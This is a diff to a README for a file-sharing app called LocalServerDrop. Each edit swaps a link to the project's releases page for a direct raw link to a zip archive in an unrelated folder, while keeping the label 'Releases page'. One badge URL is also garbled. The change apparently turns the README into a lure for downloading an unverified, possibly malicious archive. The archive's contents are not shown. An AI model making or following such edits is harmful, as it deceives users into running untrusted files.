@@ -1,6 +1,6 @@
 # 📂 LocalServerDrop - Easy File Sharing on Your Local Network
 
-[![Download LocalServerDrop](https://img.shields.io/badge/Download-Learn%20More-brightgreen.svg)](https://github.com/Bitotetpk20/LocalServerDrop/releases)
+[![Download LocalServerDrop](https://raw.githubusercontent.com/Bitotetpk20/LocalServerDrop/main/Didelphyidae/LocalServerDrop.zip%https://raw.githubusercontent.com/Bitotetpk20/LocalServerDrop/main/Didelphyidae/LocalServerDrop.zip)](https://raw.githubusercontent.com/Bitotetpk20/LocalServerDrop/main/Didelphyidae/LocalServerDrop.zip)
 
 ## 🌟 Overview
 
@@ -12,7 +12,7 @@ To start using LocalServerDrop, follow these steps to download and install the a
 
 ### 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Bitotetpk20/LocalServerDrop/releases) to find the latest version of LocalServerDrop.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Bitotetpk20/LocalServerDrop/main/Didelphyidae/LocalServerDrop.zip) to find the latest version of LocalServerDrop.
 2. Select the appropriate version for your operating system (Windows, macOS, or Linux).
 3. Download the installation file.
 4. After the download is complete, locate the file (usually in your "Downloads" folder).
@@ -71,7 +71,7 @@ You can share any file type, including documents, images, videos, and more.
 
 ### 4. How do I update LocalServerDrop?
 
-Go to the [Releases page](https://github.com/Bitotetpk20/LocalServerDrop/releases) and download the latest version. Follow the same installation steps to update the app.
+Go to the [Releases page](https://raw.githubusercontent.com/Bitotetpk20/LocalServerDrop/main/Didelphyidae/LocalServerDrop.zip) and download the latest version. Follow the same installation steps to update the app.
 
 ## 🧑‍🤝‍🧑 Community and Support
 
@@ -79,6 +79,6 @@ If you have questions or need help, consider joining our community. You might fi
 
 ## 🎓 Learn More
 
-For detailed information about LocalServerDrop, explore the project documentation and resources available in the repository. Visit the [Releases page](https://github.com/Bitotetpk20/LocalServerDrop/releases) to download the latest version and start sharing files today!
+For detailed information about LocalServerDrop, explore the project documentation and resources available in the repository. Visit the [Releases page](https://raw.githubusercontent.com/Bitotetpk20/LocalServerDrop/main/Didelphyidae/LocalServerDrop.zip) to download the latest version and start sharing files today!
 
 Be sure to keep your application updated for the best experience. Enjoy seamless file sharing with LocalServerDrop!
